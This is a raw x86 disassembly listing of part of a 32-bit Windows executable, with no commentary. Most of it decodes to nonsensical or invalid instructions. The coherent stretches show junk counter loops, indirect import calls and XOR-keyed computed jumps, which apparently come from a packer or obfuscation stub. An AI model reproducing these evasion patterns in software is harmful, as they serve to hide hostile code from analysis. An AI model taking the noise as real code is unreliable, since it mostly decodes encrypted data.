  4028e5:	cmp    ch,BYTE PTR [ebx-0xca44771]
  4028eb:	cwde   
  4028ec:	shl    DWORD PTR [ecx+ebx*8+0x43],cl
  4028f0:	loop   0x402895
  4028f2:	mov    edi,0xe774a78a
  4028f7:	mov    eax,ds:0xdeca7787
  4028fc:	std    
  4028fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028fe:	jg     0x402955
  402900:	retf   0x15ff
  402903:	ss in  eax,dx
  402905:	bound  esp,QWORD PTR [eax+0x11605205]
  40290b:	sahf   
  40290c:	mov    eax,ds:0x172f5db6
  402911:	cmp    BYTE PTR [ecx+0x21],ah
  402914:	pushf  
  402915:	xlat   BYTE PTR ds:[ebx]
  402916:	inc    esi
  402917:	test   al,0x4e
  402919:	pop    esi
  40291a:	adc    eax,0x667f8063
  40291f:	jbe    0x40292f
  402921:	fldcw  WORD PTR [edx-0x1]
  402924:	jne    0x40297d
  402926:	and    al,0x24
  402928:	adc    DWORD PTR [ecx-0x6a],esi
  40292b:	xchg   BYTE PTR [edi+ebx*4-0x26fb320],ch
  402932:	push   ebp
  402933:	ret    
  402934:	pop    ebx
  402935:	cdq    
  402936:	add    BYTE PTR [esi],ah
  402938:	jae    0x40295e
  40293a:	jmp    0x46bd:0x8c70014a
  402941:	cmp    eax,0xd7d360f5
  402946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402947:	outs   dx,DWORD PTR ds:[esi]
  402948:	fisttp QWORD PTR [ecx-0x50]
  40294b:	pop    eax
  40294c:	fdiv   st(0),st
  40294e:	add    DWORD PTR [edi],0x30a13c94
  402954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402955:	(bad)  
  402956:	pushf  
  402957:	pop    ebx
  402958:	(bad)  
  402959:	jno    0x4029c4
  40295b:	sbb    esp,DWORD PTR [ecx-0xe]
  40295e:	scas   al,BYTE PTR es:[edi]
  40295f:	cld    
  402960:	rcl    BYTE PTR [ebx-0x3e],1
  402963:	jmp    eax
  402965:	mov    edi,DWORD PTR [ebx+0x4c2c95e]
  40296b:	add    BYTE PTR [ebp-0x75],dl
  40296e:	in     al,dx
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fc5d
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e66f
  402988:	sbb    DWORD PTR ds:0x42e693,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fc69,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fc69,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fc69,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e0ac
  4029bc:	push   0x42e683
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e3cf
  4029cc:	mov    edx,DWORD PTR ds:0x42fc69
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fc69,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e67f,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e67f,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e67f,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e253
  402a0d:	cmp    DWORD PTR ds:0x42e67f,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e67f
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e67f,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e67f
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e67f,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fd2e
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fc55,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fc8d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e0a8,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e0a8,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e0a8
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e0a8,edi
  402a94:	cmp    DWORD PTR ds:0x42e0a8,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e0a8,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e0c1
  402ab3:	call   DWORD PTR ds:0x42e3d3
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xb84e3376
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x5c70707e
  402afd:	dec    ebx
  402afe:	retf   
  402aff:	inc    eax
  402b00:	adc    al,0x7
  402b02:	or     al,0x26
  402b04:	lods   eax,DWORD PTR ds:[esi]
  402b05:	arpl   WORD PTR [eax],di
  402b07:	test   eax,0x7b6dc269
  402b0c:	adc    DWORD PTR [ecx],ecx
  402b0e:	xchg   ch,ah
  402b10:	shr    DWORD PTR [edi+ebx*2],1
  402b13:	gs scas al,BYTE PTR es:[edi]
  402b15:	pop    ss
  402b16:	cwde   
  402b17:	pop    es
  402b18:	retf   
  402b19:	cwde   
  402b1a:	jns    0x402b78
  402b1c:	(bad)
  402b1f:	and    eax,0x69e02f9d
  402b24:	je     0x402b0e
  402b26:	adc    ch,ch
  402b28:	ficomp DWORD PTR [esi+0x3377c7c4]
  402b2e:	and    eax,0x154edc1b
  402b33:	mov    dl,0x74
  402b35:	les    ecx,FWORD PTR [esi]
  402b37:	jle    0x402b2c
  402b39:	or     BYTE PTR [ecx],cl
  402b3b:	xchg   edx,eax
  402b3c:	imul   ebp,DWORD PTR [eax],0xffffff99
  402b3f:	xor    ecx,DWORD PTR [edi]
  402b41:	push   0xe1dfe272
  402b46:	rcl    ebx,cl
  402b48:	sub    edi,DWORD PTR ds:0x12dc5e8
  402b4e:	stc    
  402b4f:	xor    eax,0x97750176
  402b54:	out    0x1d,eax
  402b56:	jnp    0x402b12
  402b58:	pusha  
  402b59:	ror    DWORD PTR [ebx],0x34
  402b5c:	leave  
  402b5d:	jb     0x402aec
  402b5f:	aaa    
  402b60:	push   ecx
  402b61:	loopne 0x402bc2
  402b63:	mov    edi,0x99fad153
  402b68:	jmp    0x1946:0xd33f00b3
  402b6f:	loopne 0x402b58
  402b71:	ror    ebp,cl
  402b73:	jmp    0x4dd37464
  402b78:	xor    ah,BYTE PTR [ecx-0x2a]
  402b7b:	jecxz  0x402bbf
  402b7d:	mov    ch,0xfe
  402b7f:	dec    ecx
  402b80:	lea    edi,[edi+0x25c7048f]
  402b86:	xchg   edi,eax
  402b87:	sbb    al,0x8c
  402b89:	mov    eax,gs:0x411ec349
  402b8f:	lea    esi,[esi+0x1acc0af9]
  402b95:	dec    esi
  402b96:	das    
  402b97:	inc    edi
  402b98:	jnp    0x402b1f
  402b9a:	adc    eax,0xeb2d306a
  402b9f:	ret    0x78cf
  402ba2:	ja     0x402ba7
  402ba4:	mov    ebx,0x75db6dd0
  402ba9:	or     DWORD PTR [ebp+0x12],esi
  402bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bad:	cld    
  402bae:	loop   0x402b76
  402bb0:	push   ebp
  402bb1:	xchg   edi,eax
  402bb2:	in     eax,dx
  402bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bb4:	lds    ebx,FWORD PTR ds:0xd1d8a86b
  402bba:	repz popa 
  402bbc:	pop    ecx
  402bbd:	je     0x402ba6
  402bbf:	xor    ah,bh
  402bc1:	xor    al,0xd4
  402bc3:	in     al,0xd8
  402bc5:	iret   
  402bc6:	pushf  
  402bc7:	jns    0x402be5
  402bc9:	dec    ecx
  402bca:	mov    fs,esi
  402bcc:	inc    ebp
  402bcd:	push   es
  402bce:	inc    edi
  402bcf:	jl     0x402be4
  402bd1:	add    edi,0xacaecef4
  402bd7:	add    al,0xa3
  402bd9:	mov    bl,0xc
  402bdb:	mov    ds:0xea428275,eax
  402be0:	scas   al,BYTE PTR es:[edi]
  402be1:	stos   BYTE PTR es:[edi],al
  402be2:	mov    BYTE PTR [edx-0x50],cl
  402be5:	aam    0x92
  402be7:	cmp    al,0x51
  402be9:	inc    esp
  402bea:	outs   dx,BYTE PTR ds:[esi]
  402beb:	sti    
  402bec:	ss mov ah,0x67
  402bef:	mov    eax,ds:0x25c0160d
  402bf4:	fdivr  DWORD PTR [edx]
  402bf6:	xlat   BYTE PTR ds:[ebx]
  402bf7:	out    dx,al
  402bf8:	imul   esi,DWORD PTR [edi],0x3fa5164e
  402bfe:	pop    eax
  402bff:	mov    edx,0x8c44a013
  402c04:	mov    ds:0xe93a3196,al
  402c09:	retf   
  402c0a:	scas   eax,DWORD PTR es:[edi]
  402c0b:	xlat   BYTE PTR ds:[ebx]
  402c0c:	out    dx,al
  402c0d:	mul    cl
  402c0f:	sbb    al,BYTE PTR [edi]
  402c11:	jecxz  0x402bf0
  402c13:	cmp    al,0xcd
  402c15:	cmp    DWORD PTR [esi+esi*2],edx
  402c18:	into   
  402c19:	lock jbe 0x402bee
  402c1c:	inc    esi
  402c1d:	(bad)  
  402c1e:	das    
  402c1f:	xchg   esi,eax
  402c20:	xchg   edi,eax
  402c21:	mov    cl,0xfa
  402c23:	or     al,0x68
  402c25:	pushf  
  402c26:	or     al,BYTE PTR [ebp-0x3ef2c9dc]
  402c2c:	dec    esi
  402c2d:	lods   eax,DWORD PTR ds:[esi]
  402c2e:	popf   
  402c2f:	jecxz  0x402c4a
  402c31:	jnp    0x402c14
  402c33:	fstp   st(5)
  402c35:	and    eax,DWORD PTR [ebx]
  402c37:	sbb    DWORD PTR [ecx+0x7],edi
  402c3a:	stc    
  402c3b:	dec    edx
  402c3c:	call   0xad9f:0xb23a9c68
  402c43:	inc    edx
  402c44:	xor    DWORD PTR [ebx-0x80],0x17
  402c48:	mov    al,0x75
  402c4a:	sbb    eax,0xd45f3dbe
  402c4f:	adc    al,0xd7
  402c51:	push   es
  402c52:	push   ebp
  402c53:	loope  0x402c9e
  402c55:	jnp    0x402bed
  402c57:	fsub   DWORD PTR [ebp+0x74ad5573]
  402c5d:	push   ebp
  402c5e:	je     0x402c21
  402c60:	jmp    0x854b989b
  402c65:	sbb    ecx,esp
  402c67:	xor    DWORD PTR [eax-0x6c06daa5],edx
  402c6d:	adc    bl,BYTE PTR [ecx-0x613c3efd]
  402c73:	aam    0x6a
  402c75:	retf   
  402c76:	dec    edi
  402c77:	xlat   BYTE PTR ds:[ebx]
  402c78:	or     eax,0x5ecd27f5
  402c7d:	mov    esi,0xbccd7118
  402c82:	sbb    BYTE PTR ss:[edx+0x58fc1c2],0x2d
  402c8a:	mov    cl,bl
  402c8c:	mov    ebp,0xd305f506
  402c91:	and    eax,0xa0543eb0
  402c96:	mov    WORD PTR [edx],?
  402c98:	out    dx,al
  402c99:	inc    edi
  402c9a:	lock fwait
  402c9c:	sbb    ebx,edi
  402c9e:	dec    ecx
  402c9f:	pop    ecx
  402ca0:	or     eax,0x57bb6439
  402ca5:	call   0x4f4fdb90
  402caa:	dec    esp
  402cab:	jnp    0x402cdd
  402cad:	mov    ebp,0x3603c454
  402cb2:	push   ds
  402cb3:	mov    dh,0x53
  402cb5:	jmp    DWORD PTR [edi+0x37a4442c]
  402cbb:	inc    ebp
  402cbc:	or     eax,0x23ed3878
  402cc1:	(bad)  
  402cc2:	rcr    ah,cl
  402cc4:	push   ebp
  402cc5:	push   eax
  402cc6:	cwde   
  402cc7:	(bad)
  402ccb:	outs   dx,DWORD PTR ds:[esi]
  402ccc:	test   al,0x3
  402cce:	(bad)  
  402ccf:	call   0x31f9f1cf
  402cd4:	sar    DWORD PTR [esi-0xd],0xb3
  402cd8:	pop    ebp
  402cd9:	xor    BYTE PTR [edi+0x5beec667],dh
  402cdf:	int3   
  402ce0:	or     al,0x4c
  402ce2:	sub    bh,ah
  402ce4:	jl     0x402c99
  402ce6:	loopne 0x402cd0
  402ce8:	bnd jp 0x402d39
  402ceb:	push   cs
  402cec:	dec    esp
  402ced:	mov    ebp,0xa3e645f
  402cf2:	add    eax,0x11f61874
  402cf7:	and    al,0xfe
  402cf9:	sub    dh,bh
  402cfb:	nop
  402cfc:	fimul  WORD PTR [esi-0x18cdbc30]
  402d02:	add    DWORD PTR [edx+0x647f351],esp
  402d08:	aam    0x11
  402d0a:	faddp  st(3),st
  402d0c:	fsubr  st,st(0)
  402d0e:	sub    DWORD PTR [ebp+0x3a00cd4c],esp
  402d14:	arpl   WORD PTR [ebp+0x3702d744],di
  402d1a:	jns    0x402cfb
  402d1c:	mov    ds:0xfc7421ac,al
  402d21:	cmp    DWORD PTR [edi-0x304d02],eax
  402d27:	push   es
  402d28:	ret    
  402d29:	dec    ebx
  402d2a:	inc    edx
  402d2b:	in     eax,0xdd
  402d2d:	or     eax,0xa00cf081
  402d32:	pop    ds
  402d33:	and    dx,WORD PTR [ecx+0x1ee31659]
  402d3a:	jne    0x402cde
  402d3c:	test   DWORD PTR fs:[eax-0x4c],ebx
  402d40:	xlat   BYTE PTR ds:[ebx]
  402d41:	popa   
  402d42:	sbb    edx,esp
  402d44:	sbb    ch,bl
  402d46:	gs jns 0x402dab
  402d49:	or     esi,DWORD PTR [eax-0x4160134a]
  402d4f:	clc    
  402d50:	cmpps  xmm3,XMMWORD PTR [edi],0xe0
  402d54:	inc    edi
  402d55:	push   es
  402d56:	lahf   
  402d57:	push   edx
  402d58:	ror    BYTE PTR [esi],cl
  402d5a:	push   ds
  402d5b:	(bad)  
  402d5c:	adc    al,0x24
  402d5e:	or     DWORD PTR [ebp+eiz*8-0x28],ebx
  402d62:	scas   al,BYTE PTR es:[edi]
  402d63:	int3   
  402d64:	sub    ebp,edi
  402d66:	and    esp,edi
  402d68:	retf   
  402d69:	pop    es
  402d6a:	sub    eax,0xb8a6aa77
  402d6f:	shl    DWORD PTR [edx+0x72],1
  402d72:	ins    DWORD PTR es:[edi],dx
  402d73:	mov    esp,0x3641dcde
  402d78:	fcom   DWORD PTR [esi-0x73]
  402d7b:	ja     0x402d06
  402d7d:	xchg   esi,eax
  402d7e:	(bad)  
  402d7f:	jmp    0x402da3
  402d81:	or     al,0x6f
  402d83:	mul    BYTE PTR [ecx+0x21]
  402d86:	aam    0x24
  402d88:	int    0x2b
  402d8a:	inc    ecx
  402d8b:	fs xchg edx,eax
  402d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d8e:	xor    eax,0x5f1ca859
  402d93:	sbb    al,0xbd
  402d95:	sahf   
  402d96:	loopne 0x402d5d
  402d98:	adc    esp,DWORD PTR [ebx]
  402d9a:	popf   
  402d9b:	xchg   esp,eax
  402d9c:	sbb    eax,0xfe6b3e19
  402da1:	in     eax,0xee
  402da3:	add    al,0xcb
  402da5:	mov    dh,0x43
  402da7:	xchg   ebp,eax
  402da8:	push   esi
  402da9:	(bad)
  402dad:	xor    ebx,DWORD PTR [esi]
  402daf:	cli    
  402db0:	fld1   
  402db2:	lock mov esp,0xa18aac3d
  402db8:	cmp    DWORD PTR [edi-0x1b],0xffffffe6
  402dbc:	xchg   ebx,eax
  402dbd:	addr16 add edx,esi
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	pop    edx
  402de0:	sub    al,0x8d
  402de2:	xlat   BYTE PTR ds:[ebx]
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e02
  402dec:	in     al,0x2
  402dee:	xor    al,0x5
  402df0:	mov    ebp,0xea194fad
  402df5:	jp     0x402e30
  402df7:	mov    al,0x11
  402df9:	shl    BYTE PTR [ebx+0x420180ba],cl
  402dff:	hlt    
  402e00:	sbb    al,0xd0
  402e02:	fdiv   st(0),st
  402e04:	jnp    0x402e12
  402e06:	sub    BYTE PTR [ebp-0x4b4751ee],cl
  402e0c:	adc    al,0x33
  402e0e:	mov    al,0xa0
  402e10:	lea    edx,[ebx+0x1da29bc7]
  402e16:	sbb    ecx,DWORD PTR [ebx-0x2f]
  402e19:	push   esi
  402e1a:	mov    bl,0xbd
  402e1c:	add    ch,al
  402e1e:	rcl    al,1
  402e20:	popf   
  402e21:	mul    BYTE PTR [eax-0x4e]
  402e24:	test   DWORD PTR [ebx+0xdf940e2],0x7210cb77
  402e2e:	shl    BYTE PTR [ebx+0x48fe8651],cl
  402e34:	jp     0x402e3b
  402e36:	sub    esp,0x19
  402e39:	fimul  DWORD PTR [ecx]
  402e3b:	cmp    esi,0xffffff98
  402e3e:	dec    ebx
  402e3f:	stos   DWORD PTR es:[edi],eax
  402e40:	add    bh,BYTE PTR [eax+0x254ce665]
  402e46:	cmp    bl,BYTE PTR [ecx-0x7c2f5dcd]
  402e4c:	test   al,0x6b
  402e4e:	cli    
  402e4f:	fdiv   st,st(7)
  402e51:	aaa    
  402e52:	ja     0x402e8d
  402e54:	push   esp
  402e55:	add    eax,0x3e075f9
  402e5a:	sbb    al,0x9
  402e5c:	enter  0x6a3a,0x91
  402e60:	jne    0x402e63
  402e62:	mov    dl,BYTE PTR [edi+eax*4]
  402e65:	xchg   esi,eax
  402e66:	dec    esi
  402e67:	adc    BYTE PTR gs:[esi-0x7c],ah
  402e6b:	dec    edx
  402e6c:	outs   dx,DWORD PTR ds:[esi]
  402e6d:	icebp  
  402e6e:	mov    esi,0x9cae6543
  402e73:	(bad)  
  402e74:	not    eax
  402e76:	leave  
  402e77:	xchg   ebp,eax
  402e78:	js     0x402eb3
  402e7a:	outs   dx,DWORD PTR ds:[esi]
  402e7b:	mov    ch,BYTE PTR [ebx-0x53]
  402e7e:	cdq    
  402e7f:	mov    ch,0x56
  402e81:	(bad)  
  402e82:	cmp    eax,0xfbfae0ae
  402e87:	or     eax,0xbc1b684b
  402e8c:	icebp  
  402e8d:	pusha  
  402e8e:	dec    edx
  402e8f:	int    0x7f
  402e91:	sti    
  402e92:	pop    eax
  402e93:	rol    DWORD PTR [edx],0x22
  402e96:	gs ds (bad) 
  402e99:	pop    edx
  402e9a:	xchg   ebx,eax
  402e9b:	sti    
  402e9c:	fisttp WORD PTR [edi-0x25d23d66]
  402ea2:	mov    BYTE PTR [ebx+0x64],ch
  402ea5:	mov    ebp,esi
  402ea7:	fs mov edi,0xedff84a4
  402ead:	data16 (bad) 
  402eaf:	adc    DWORD PTR [esi],ebp
  402eb1:	and    al,0x89
  402eb3:	ds mov edi,0x37a87e16
  402eb9:	aad    0xe8
  402ebb:	pop    es
  402ebc:	cmp    BYTE PTR [esi+ecx*1+0x31bae4d9],0xef
  402ec4:	popf   
  402ec5:	lahf   
  402ec6:	mov    ebp,0xf8d40a63
  402ecb:	outs   dx,BYTE PTR ds:[esi]
  402ecc:	pop    esi
  402ecd:	xchg   edi,eax
  402ece:	jno    0x402eb4
  402ed0:	sub    al,0x6a
  402ed2:	jp     0x402ea8
  402ed4:	mov    esp,0x5c1a4f5f
  402ed9:	out    0xb1,al
  402edb:	out    0x9f,eax
  402edd:	push   esp
  402ede:	jae    0x402e92
  402ee0:	cs xchg ecx,eax
  402ee2:	dec    edi
  402ee3:	mov    al,ds:0xf0871e4e
  402ee8:	pop    ss
  402ee9:	and    ah,bl
  402eeb:	cdq    
  402eec:	cli    
  402eed:	jbe    0x402e70
  402eef:	xor    BYTE PTR [edx],ah
  402ef1:	pop    ss
  402ef2:	push   ebx
  402ef3:	iret   
  402ef4:	mov    cl,0x29
  402ef6:	(bad)  
  402ef7:	scas   eax,DWORD PTR es:[edi]
  402ef8:	test   al,0xc9
  402efa:	ss mov esp,0x98969b44
  402f00:	aaa    
  402f01:	loop   0x402eb6
  402f03:	sar    BYTE PTR ds:0x1a63eb9,cl
  402f09:	inc    esp
  402f0a:	push   ss
  402f0b:	fmul   QWORD PTR [edi-0x76]
  402f0e:	and    cl,BYTE PTR [eax]
  402f10:	cvtdq2ps xmm4,XMMWORD PTR [esi]
  402f13:	mov    WORD PTR [esi+0xcd1d671],gs
  402f19:	mov    edx,edx
  402f1b:	out    0xcd,al
  402f1d:	repnz xchg sp,ax
  402f20:	lods   eax,DWORD PTR ds:[esi]
  402f21:	mov    gs,edi
  402f23:	fidivr WORD PTR [edx+0x6f8f4f4b]
  402f29:	sub    BYTE PTR [edx-0x4d],al
  402f2c:	xchg   edi,eax
  402f2d:	je     0x402f09
  402f2f:	mov    BYTE PTR [ecx],al
  402f31:	and    al,BYTE PTR ds:0x899984f5
  402f37:	xchg   esp,eax
  402f38:	inc    ecx
  402f39:	fadd   QWORD PTR [edx]
  402f3b:	mov    ch,0x83
  402f3d:	adc    al,0x32
  402f3f:	arpl   WORD PTR [eax+ebp*2],dx
  402f42:	(bad)  
  402f43:	cwde   
  402f44:	fisub  DWORD PTR [eax*4-0x757599de]
  402f4b:	sbb    dl,BYTE PTR [esi-0x13]
  402f4e:	fisttp WORD PTR [eax]
  402f50:	pop    ebx
  402f51:	das    
  402f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f53:	add    DWORD PTR [ebx+0x25],esi
  402f56:	mov    esi,0x584d1e84
  402f5b:	adc    cl,BYTE PTR [ecx+0x2c4b8096]
  402f61:	das    
  402f62:	cwde   
  402f63:	cmp    al,0xcb
  402f65:	cmp    eax,0x167a4d29
  402f6a:	pusha  
  402f6b:	jl     0x402eff
  402f6d:	xchg   esp,eax
  402f6e:	pop    ebp
  402f6f:	mov    ebp,0xd89a7dc5
  402f74:	iret   
  402f75:	lds    edi,FWORD PTR [ebx-0x41]
  402f78:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  402f7a:	push   edx
  402f7b:	sbb    eax,0x4b41d24
  402f80:	jb     0x402fe5
  402f82:	shl    BYTE PTR [ebp-0x72],cl
  402f85:	in     eax,0x10
  402f87:	mov    bh,0xdc
  402f89:	and    DWORD PTR [esi+0x22d307f0],0x70bf02dd
  402f93:	cmp    al,0xb8
  402f95:	cwde   
  402f96:	repz inc edi
  402f98:	mov    ebx,0xe886b901
  402f9d:	fs add edi,edx
  402fa0:	in     eax,0x1c
  402fa2:	push   es
  402fa3:	xchg   esp,eax
  402fa4:	push   esi
  402fa5:	lods   eax,DWORD PTR ds:[esi]
  402fa6:	je     0x402f5e
  402fa8:	out    dx,eax
  402fa9:	hlt    
  402faa:	out    0xca,eax
  402fac:	hlt    
  402fad:	xor    DWORD PTR [ebp-0x26775dfb],0x35
  402fb4:	cmp    BYTE PTR [ecx],ch
  402fb6:	jae    0x402ff6
  402fb8:	mov    esi,ebp
  402fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fbb:	sbb    DWORD PTR [eax+ebx*1-0x55],0xfffffff9
  402fc0:	mov    esi,0x55c67ad7
  402fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fc6:	mov    al,0x44
  402fc8:	xchg   ecx,eax
  402fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fca:	xchg   ecx,eax
  402fcb:	ret    0xeb06
  402fce:	outs   dx,BYTE PTR ds:[esi]
  402fcf:	iret   
  402fd0:	jecxz  0x402ffe
  402fd2:	pushf  
  402fd3:	jae    0x403045
  402fd5:	cmp    DWORD PTR [eax-0x43],edx
  402fd8:	scas   al,BYTE PTR es:[edi]
  402fd9:	ss push 0x8556ddd2
  402fdf:	and    eax,0xfe8cf104
  402fe4:	out    0x75,al
  402fe6:	repz jecxz 0x402f86
  402fe9:	mov    ebx,0xd0f11d3b
  402fee:	jbe    0x403066
  402ff0:	add    al,0xf1
  402ff2:	sbb    al,BYTE PTR [eax+0x75de2c2a]
  402ff8:	in     al,dx
  402ff9:	fisubr WORD PTR [ebx-0x337648fc]
  402fff:	popf   
  403000:	std    
  403001:	xchg   ebp,eax
  403002:	adc    al,0x38
  403004:	or     al,0xd
  403006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403007:	ins    DWORD PTR es:[edi],dx
  403008:	pushf  
  403009:	or     dh,0xdd
  40300c:	xor    ah,BYTE PTR [edi-0x4522dd1]
  403012:	in     al,0x56
  403014:	scas   eax,DWORD PTR es:[edi]
  403015:	push   esp
  403016:	imul   edi
  403018:	dec    ebp
  403019:	call   0xfdc0:0x33256aad
  403020:	jp     0x403070
  403022:	push   esp
  403023:	adc    esi,0x7
  403026:	add    eax,0x758cad22
  40302b:	test   eax,0x7fe9b65c
  403030:	stos   BYTE PTR es:[edi],al
  403031:	retf   0x5b44
  403034:	cmp    esp,DWORD PTR [edx+0x12]
  403037:	loop   0x403007
  403039:	cmp    BYTE PTR [ebx],dl
  40303b:	mov    esi,0xcd77a1bb
  403040:	push   es
  403041:	ins    BYTE PTR es:[edi],dx
  403042:	mov    eax,ds:0xd5481ce
  403047:	(bad)  
  403048:	ds ins BYTE PTR es:[edi],dx
  40304a:	jno    0x402fde
  40304c:	outs   dx,BYTE PTR ds:[esi]
  40304d:	stos   BYTE PTR es:[edi],al
  40304e:	lahf   
  40304f:	fldenv [ebp+0x43]
  403052:	stos   BYTE PTR es:[edi],al
  403053:	push   0x28
  403055:	icebp  
  403056:	jp     0x40305c
  403058:	fdivr  DWORD PTR [edx+ebp*8-0x1d42a5c8]
  40305f:	and    DWORD PTR [edx],0x9b1f0fad
  403065:	mov    cl,0x4c
  403067:	and    DWORD PTR [ebx-0x65],0x757194f9
  40306e:	cmp    al,0xa7
  403070:	mov    cl,0x21
  403072:	adc    dl,al
  403074:	pop    edx
  403076:	jecxz  0x40300f
  403078:	in     eax,dx
  403079:	push   edi
  40307a:	push   cs
  40307b:	imul   BYTE PTR [ebx]
  40307d:	xor    bh,al
  40307f:	out    dx,al
  403080:	inc    edi
  403081:	int3   
  403082:	mov    eax,0x9506b464
  403087:	add    ebx,DWORD PTR [ebx+0x47]
  40308a:	dec    esp
  40308b:	je     0x403091
  40308d:	sar    BYTE PTR [esi-0xe],cl
  403090:	fisubr DWORD PTR [edi+0x39]
  403093:	xlat   BYTE PTR ds:[ebx]
  403094:	repnz push edi
  403096:	inc    esp
  403097:	test   eax,0xd8351cd5
  40309c:	xor    al,0x7f
  40309e:	xor    ebp,DWORD PTR [esi+0x32]
  4030a1:	ror    DWORD PTR [esi+0x4de268fe],0x5d
  4030a8:	pop    edx
  4030a9:	mov    dh,0x16
  4030ab:	push   eax
  4030ac:	ds mov esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xc2
  4030ce:	xor    eax,0x17fc473a
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0xdd70707e
  4030da:	out    dx,eax
  4030db:	pop    edx
  4030dc:	arpl   WORD PTR [edx+0xc],ax
  4030df:	fwait
  4030e0:	enter  0xec71,0x6a
  4030e4:	jmp    0x4030b2
  4030e6:	adc    eax,eax
  4030e8:	mov    al,0x1d
  4030ea:	stos   DWORD PTR es:[edi],eax
  4030eb:	jmp    0x40311f
  4030ed:	std    
  4030ee:	push   ds
  4030ef:	push   0x65
  4030f1:	inc    ecx
  4030f2:	sub    BYTE PTR [esi-0x1232b99],0x17
  4030f9:	jmp    0x4030b3
  4030fb:	aam    0x75
  4030fd:	inc    eax
  4030fe:	aaa    
  4030ff:	ret    
  403100:	inc    edx
  403101:	mov    DWORD PTR [edi+0x25],ebp
  403104:	mov    WORD PTR [ebp+eiz*8-0x46],?
  403108:	jecxz  0x403146
  40310a:	push   cs
  40310b:	fwait
  40310c:	and    dl,BYTE PTR [esi-0x2eea3e6e]
  403112:	loopne 0x40312b
  403114:	popf   
  403115:	add    BYTE PTR [edi+ebp*8-0x2d38d5ca],dh
  40311c:	pop    esp
  40311d:	ss scas al,BYTE PTR es:[edi]
  40311f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403120:	push   0x23
  403122:	pop    esp
  403123:	repnz inc ecx
  403125:	neg    ebx
  403127:	into   
